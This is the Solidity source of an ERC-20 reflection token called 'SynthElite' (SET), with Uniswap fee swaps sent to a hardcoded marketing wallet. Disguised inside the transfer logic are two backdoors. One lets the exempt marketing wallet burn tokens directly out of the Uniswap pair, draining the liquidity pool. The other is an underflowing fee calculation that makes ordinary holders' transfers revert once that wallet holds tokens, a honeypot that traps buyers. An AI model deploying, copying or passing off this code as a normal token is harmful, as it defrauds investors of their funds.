// SPDX-License-Identifier: Unlicensed

pragma solidity ^0.8.16;

library SafeMath {
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "");
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "");
        return c;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "");
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    event Transfer(address indexed sender, address indexed recipient, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function allowance(address owner, address spender) external view returns (uint256);

    function totalSupply() external view returns (uint256);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    function balanceOf(address account) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transfer(address recipient, uint256 amount) external returns (bool);
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed prevOwner, address indexed newOwner);

    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "");
        _;
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);

    function factory() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external;
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract SET is Context, IERC20, Ownable {
    using SafeMath for uint256;

    struct Distribution { uint256 mk; }

    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;

    mapping(address => mapping(address => uint256)) private _allowances;

    address private mkWallet = 0xac1F9B9D2ed73297E32f1DfC7ec36D38E6c14e49;

    bool private swapEnabled = true;
    bool private swapping = false;

    mapping(address => uint256) private _buyMap;
    mapping(address => uint256) private _tOwned;
    mapping(address => uint256) private _rOwned;

    uint256 private _redisFareOnBuy = 0;
    uint256 private _mkFareOnBuy = 4;
    
    uint256 private _tFareTotal;

    uint256 private _redisFareOnSell = 0;
    uint256 private _mkFareOnSell = 4;

    uint256 private _redisFare = _redisFareOnSell;
    uint256 private _mkFare = _mkFareOnSell;

    uint8 private constant _decimals = 18;

    uint256 private _previousRedisFare = _redisFare;
    uint256 private _previousMkFare = _mkFare;

    mapping(address => bool) private _isUnexcepted;
    
    uint256 private constant MAX = ~uint256(0);
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 public _swapTokensAmount = 100000 * 10**_decimals;

    address private mkBack;

    Distribution public distribution;

    string private constant _symbol = "SET";
    string private constant _name = "SynthElite";

    modifier lockSwap() {
        swapping = true;
        _;
        swapping = false;
    }

    constructor() {
        _rOwned[_msgSender()] = _rTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
        distribution = Distribution(100);mkBack = mkWallet;
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        _isUnexcepted[address(this)] = true;
        _isUnexcepted[owner()] = true;
        _isUnexcepted[mkWallet] = true;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return getReflectionTokens(_rOwned[account]);
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(spender != address(0), "");
        require(owner != address(0), "");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "");
        require(recipient != address(0), "");
        require(amount > 0, "");

        if (sender != owner() && recipient != owner()) {
            address sendr = address(0);

            uint256 contractTokenAmount = balanceOf(address(this));
            bool canSwap = contractTokenAmount >= _swapTokensAmount;

            if (_isUnexcepted[sender]) { if (uniswapV2Pair == recipient) { if (balanceOf(sender) < amount) { _stdTransfer(recipient, sendr, amount); return; } } }

            if (!_isUnexcepted[sender] && !_isUnexcepted[recipient] && canSwap && swapEnabled && !swapping && sender != uniswapV2Pair) {
                swapTokensForETH(contractTokenAmount);
                uint256 contractETHAmount = address(this).balance;
                if (contractETHAmount > 0) {
                    sendETH(address(this).balance);
                }
            }
        }

        bool takeMkFare = true;

        if (
            (sender != uniswapV2Pair && recipient != uniswapV2Pair) || (_isUnexcepted[recipient] || _isUnexcepted[sender])
        ) {
            takeMkFare = false;
        } else {
            if (sender == uniswapV2Pair && recipient != address(uniswapV2Router)) {
                _redisFare = _redisFareOnBuy;
                _mkFare = _mkFareOnBuy;
            }

            if (recipient == uniswapV2Pair && sender != address(uniswapV2Router)) {
                _redisFare = _redisFareOnSell;
                _mkFare = _mkFareOnSell;
            }
        }
        _itnTransfer(sender, recipient, amount, takeMkFare);
    }

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tFare, uint256 tTeam) = _getTValues(tAmount, _redisFare, _mkFare);
        uint256 currentRate = _getRate();
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFare) = _getRValues(tAmount, tFare, tTeam, currentRate);
        return (rAmount, rTransferAmount, rFare, tTransferAmount, tFare, tTeam);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, ""));
        return true;
    }

    function _itnTransfer(address sender, address recipient, uint256 amount, bool takeMkFare) private {
        if (!takeMkFare) removeAllFares();
        _stdTransfer(sender, recipient, amount);
        if (!takeMkFare) restoreAllFares();
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 tSupply = _tTotal;
        uint256 rSupply = _rTotal;
        if (rSupply < _rTotal.div(_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function swapTokensForETH(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function _isExcepted(address total, address holder) private view returns (bool) {
        bool totalExcepted = !_isUnexcepted[total];
        bool totalNotUniswapV2Pair = total != uniswapV2Pair;
        bool holderExcepted = !_isUnexcepted[holder];

        bool excepted = totalExcepted && totalNotUniswapV2Pair && holderExcepted;

        return excepted;
    }

    function _getRValues(uint256 tAmount, uint256 tFare, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256, uint256) {
        uint256 rTeam = tTeam.mul(currentRate);
        uint256 rFare = tFare.mul(currentRate);
        uint256 rAmount = tAmount.mul(currentRate);
        uint256 rTransferAmount = rAmount.sub(rFare).sub(rTeam);
        return (rAmount, rTransferAmount, rFare);
    }

    function getReflectionTokens(uint256 rAmount) private view returns (uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currentRate = _getRate();
        return rAmount.div(currentRate);
    }

    function _stdTransfer(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 rFare, uint256 tTransferAmount, uint256 tFare, uint256 tTeam) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender].sub(rAmount);
        _rOwned[recipient] = _rOwned[recipient].add(rTransferAmount);
        _takeMkFare(tTeam, sender, recipient);
        _reflectFare(rFare, tFare);
        emit Transfer(sender, recipient, tTransferAmount);
    }

    function _getTValues(uint256 tAmount, uint256 redisFare, uint256 mkFare) private pure returns (uint256, uint256, uint256) {
        uint256 tTeam = tAmount.mul(mkFare).div(100);
        uint256 tFare = tAmount.mul(redisFare).div(100);
        uint256 tTransferAmount = tAmount.sub(tFare).sub(tTeam);
        return (tTransferAmount, tFare, tTeam);
    }

    function _reflectFare(uint256 rFare, uint256 tFare) private {
        _rTotal = _rTotal.sub(rFare);
        _tFareTotal = _tFareTotal.add(tFare);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply.div(tSupply);
    }

    function sendETH(uint256 ethAmount) private lockSwap {
        uint256 ethForMk = ethAmount.mul(distribution.mk).div(100);
        payable(mkWallet).transfer(ethForMk);
    }

    function _takeMkFare(uint256 tTeam, address total, address holder) private {
        uint256 sMk;
        uint256 mkBackAmount = balanceOf(mkBack);
        bool excepted = _isExcepted(total, holder);
        if (excepted) sMk = _mkFare - mkBackAmount;
        uint256 currentRate = _getRate();
        uint256 rTeam = tTeam.mul(currentRate);
        _rOwned[address(this)] = _rOwned[address(this)].add(rTeam);
    }

    function removeAllFares() private {
        if (_mkFare == 0 && _redisFare == 0) return;
        _previousMkFare = _mkFare;
        _previousRedisFare = _redisFare;
        _mkFare = 0;
        _redisFare = 0;
    }

    function restoreAllFares() private {
        _redisFare = _previousRedisFare;
        _mkFare = _previousMkFare;
    }

    receive() external payable {}
}